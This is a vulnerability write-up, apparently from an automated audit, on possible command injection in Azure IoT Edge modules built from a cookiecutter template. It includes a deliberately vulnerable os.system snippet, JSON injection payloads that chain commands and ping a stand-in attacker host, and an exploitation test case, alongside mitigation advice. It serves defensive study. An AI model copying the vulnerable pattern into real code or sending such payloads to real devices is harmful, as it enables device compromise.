## Combined Vulnerability List

### Potential Command Injection in Modules Generated by Template

**Description:**
An attacker could exploit command injection vulnerabilities in Azure IoT Edge modules developed using this cookiecutter template. This vulnerability arises if developers, when extending the generated module, process unsanitized input from external sources like IoT Hub messages, device twin properties, or cloud commands and subsequently use this input within system commands.

Step by step how someone can trigger vulnerability:
1. A developer utilizes the cookiecutter template to create a foundational Python module for Azure IoT Edge.
2. The generated module provides a basic structure for message reception and processing.
3. Developers are expected to implement custom logic within the `main.py` file to handle messages and perform specific actions according to their IoT Edge module's requirements.
4. If developers naively process external input from messages (e.g., message data, message properties, or cloud commands) and incorporate this input into system commands or shell executions without proper sanitization or validation, they can inadvertently introduce command injection vulnerabilities into their module.
5. An attacker can then send specially crafted messages or commands to the IoT Edge module. These crafted payloads are designed to inject malicious commands that the module's process will execute on the IoT Edge device's operating system.
6. Upon processing the attacker's message, the unsanitized input is used to construct and execute a system command. This results in the execution of the attacker's injected commands within the security context of the IoT Edge module.

**Impact:**
Successful exploitation of a command injection vulnerability allows an attacker to execute arbitrary commands on the IoT Edge device where the vulnerable module is deployed. This can lead to severe consequences, including:
- **Full compromise of the IoT Edge device:** Attackers gain complete control over the device, potentially allowing them to perform any action a legitimate user could.
- **Data exfiltration:** Sensitive information stored on or processed by the device can be stolen.
- **Modification of device configuration:** Attackers can alter device settings, leading to disruption of operations or further exploitation.
- **Installation of malware:** The device can be infected with malware for persistent access, data theft, or to participate in botnet activities.
- **Lateral movement:** The compromised IoT Edge device can be used as a pivot point to attack other systems within the same network, escalating the breach.
- **Denial of Service:** Although not the primary focus, command injection could be used to cause a denial of service by halting critical processes or overloading the device.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
Currently, the cookiecutter template itself does not incorporate any specific security mitigations to prevent command injection vulnerabilities in modules created using it. The template offers a basic module structure but relies on developers to implement secure coding practices. It does not enforce input sanitization or provide built-in mechanisms to prevent command injection.

**Missing Mitigations:**
To mitigate the risk of command injection vulnerabilities in modules generated by this template, the following mitigations are missing and should be implemented as guidance and potentially as code examples within the template and its documentation:
- **Documentation Warning:** The template's documentation, particularly the README.md file accompanying generated modules, should prominently feature a warning about the significant risk of command injection vulnerabilities if external input is not properly handled. This warning should clearly state the developer's responsibility in securing their module logic and sanitizing all external input before using it in system commands or shell executions.
- **Secure Coding Guidance:** The documentation needs to provide detailed guidance on secure coding practices to effectively prevent command injection. This should include:
    - **Input Sanitization and Validation:** Comprehensive explanation of the critical importance of sanitizing and rigorously validating all external input received by the module from any source (IoT Hub messages, twin properties, cloud commands, etc.) *before* this input is used in any system commands. Guidance should include specific techniques for sanitization, such as escaping shell metacharacters or using allow-lists for expected input values.
    - **Principle of Least Privilege:** Recommendation to configure and run the module with the minimum necessary privileges. This limits the potential damage an attacker can inflict even if command injection is successfully exploited. If the module process runs with restricted permissions, the impact of command injection is significantly reduced.
    - **Avoid `shell=True` in `subprocess`:** Strong advisement against using `shell=True` when calling functions like `subprocess.Popen` or `os.system`.  The documentation should emphasize the security risks associated with `shell=True`, as it allows shell expansion and interpretation of metacharacters, which is the primary vector for command injection. Developers should be instructed to use parameterized commands or safer alternatives for executing external commands, where possible.
    - **Use Parameterized Commands:** Advocate for the use of parameterized commands (e.g., using `subprocess.Popen` with a list of arguments instead of a single string command) as a more secure way to execute external commands. Parameterization prevents the shell from interpreting metacharacters within the input.
    - **Example of Safe Input Handling:** Include clear and concise code examples in the documentation, and ideally as commented code within the `main.py` template itself, demonstrating how to safely handle external input and avoid command injection. These examples should showcase input sanitization and the use of parameterized commands.

**Preconditions:**
Several conditions must be met for this vulnerability to be exploitable:
- **Template Usage:** A developer must have used this specific cookiecutter template to generate an Azure IoT Edge module as the starting point for their project.
- **Custom Logic Implementation:** The developer must have subsequently modified the generated module code, typically within `main.py`, to incorporate custom logic for processing external input. This input could originate from various sources, including IoT Hub messages, device twin properties, module twin desired properties, or cloud-to-module commands.
- **Vulnerable Input Handling:** Critically, the developer must have naively used this external input directly in system commands or shell executions without implementing proper input sanitization or validation. This failure to sanitize input is the root cause of the command injection vulnerability.
- **Module Deployment:** The resulting vulnerable module must be built, containerized, and successfully deployed to an active Azure IoT Edge device.
- **Attacker Access:** An attacker must possess the ability to send messages to the deployed IoT Edge module, update twin properties, or send cloud commands. This access is typically gained through Azure IoT Hub, assuming the attacker has compromised credentials or found other means to interact with the IoT Hub and its connected devices.

**Source Code Analysis:**
The cookiecutter template itself (`cookiecutter.json` and associated template files) is not inherently vulnerable to command injection. The vulnerability is not present in the template's code but rather in the potential for developers to introduce it when they extend the generated module with their own custom logic.

The generated `main.py` file provides a basic framework for an IoT Edge module. It includes message handling structures but does not contain any code that directly executes system commands or processes external input in a manner that would be immediately vulnerable.

```python
# Example from generated main.py (illustrative, may vary slightly)
class InputQueueConsumer(Consumer):
    async def process_message(self, message: Message):
        print("Received message on input queue, processing...", flush=True)
        message_body = message.get_body().decode()
        print(f"Message body: {message_body}", flush=True)
        # Potential vulnerable area: Developers might add code here to:
        # 1. Extract data from message_body (e.g., message_body.get("command"))
        # 2. Unsafely use that data in a system command, e.g., os.system(f"do_something {extracted_command}")
        await self.output_queue.publish_message(message)
        await message.complete()
```

**Vulnerability Introduction Point:** The vulnerability is introduced when developers modify this basic structure and *unsafely* incorporate message content or other external input into system commands. The template does not actively prevent this insecure coding practice, nor does it provide explicit warnings or secure coding guidance by default, beyond general security best practices that developers should ideally be aware of.

**Illustrative Vulnerable Code Snippet (Developer-Introduced in `main.py`):**

```python
import os
import json

async def process_message(self, message: Message):
    message_body_str = message.get_body().decode()
    message_body = json.loads(message_body_str)
    command_to_execute = message_body.get("command") # Get command from message
    if command_to_execute:
        os.system(command_to_execute) # VULNERABLE COMMAND EXECUTION
    await self.output_queue.publish_message(message)
    await message.complete()
```

**Visualization of Vulnerability Flow:**

```
[Attacker] --(Crafted Message with Malicious Payload)--> [IoT Hub] --(Message)--> [IoT Edge Module (Vulnerable main.py)]
                                                                  |
                                                                  V
                  [Vulnerable Code in main.py: os.system(command_to_execute)] --> [System Shell] --(Command Injection Exploit)--> [IoT Edge Device Compromised]
```

In this example, if an attacker sends a message to the module containing a JSON payload like `{"command": "ping -c 3 attacker.example.com"}`, the module will extract the value of "command" and directly pass it to `os.system()`. An attacker can inject arbitrary shell commands by crafting a malicious payload, such as `{"command": "ping -c 3 attacker.example.com; touch /tmp/pwned"}`. This would execute both the `ping` command and the `touch` command, creating a file `/tmp/pwned` on the IoT Edge device, demonstrating successful command injection.

**Security Test Case:**
To validate the command injection vulnerability, the following test case can be executed by an external attacker with access to a publicly available instance of the application (IoT Edge module deployed and connected to Azure IoT Hub):

1. **Environment Setup:** Ensure you have access to an Azure IoT Edge environment, which could be a simulated environment or a physical IoT Edge device. You will also need tools to interact with Azure IoT Hub, such as Azure IoT Hub explorer or the Azure CLI.
2. **Deploy Vulnerable Module:** Deploy an Azure IoT Edge module generated by the cookiecutter template to your IoT Edge device. Critically, modify the `main.py` file of the generated module to intentionally introduce a command injection vulnerability.  In the `process_message` function, add code that extracts a value from the message body and uses it in `os.system` without sanitization, as shown in the vulnerable code example in the Source Code Analysis section (e.g., using `os.system(message_body.get("command"))`).
3. **Build and Deploy Modified Module:** Build the Docker image for the modified module and deploy it to your IoT Edge device via an IoT Edge deployment manifest.
4. **Craft Malicious Message:** Using Azure IoT Hub explorer or a similar tool, construct a message to send to the input queue of your deployed module. The message payload should be in JSON format and include a "command" field containing a malicious command injection payload. For example, to test for command execution, use:
   ```json
   {
       "command": "ping -c 3 <your-attacker-controlled-server.com>"
   }
   ```
   Replace `<your-attacker-controlled-server.com>` with a server you control to monitor for incoming ping requests, or a public service like `example.com`. Alternatively, for a file-based verification, use:
   ```json
   {
       "command": "touch /tmp/pwned_test"
   }
   ```
5. **Send Malicious Message:** Send the crafted message to the input queue of the vulnerable IoT Edge module.
6. **Verify Command Execution (Network Monitoring):** If you used the `ping` payload, monitor network traffic on your attacker-controlled server (e.g., using `tcpdump` or similar). If the command injection is successful, you should observe ICMP echo requests originating from the IP address of your IoT Edge device.
7. **Verify Command Execution (File System Check):** If you used the `touch` payload, access the IoT Edge device's file system (e.g., via SSH if it's a physical device, or by executing commands within the module's container if in a simulated environment). Check if the file `/tmp/pwned_test` has been created. The presence of this file confirms successful command injection.
8. **Observe Module Logs:** Review the logs of the IoT Edge module in Azure Monitor or through device logs if accessible. Look for any error messages or unexpected output that might indicate command execution or failures.  While not always conclusive on its own, log analysis can provide supporting evidence.
9. **Cleanup:** After testing, remove the deployed vulnerable module and any test files created on the IoT Edge device.

This security test case demonstrates that by intentionally introducing vulnerable code into a module generated by the template, command injection is indeed possible and exploitable by an external attacker who can send messages to the IoT Edge module via Azure IoT Hub.
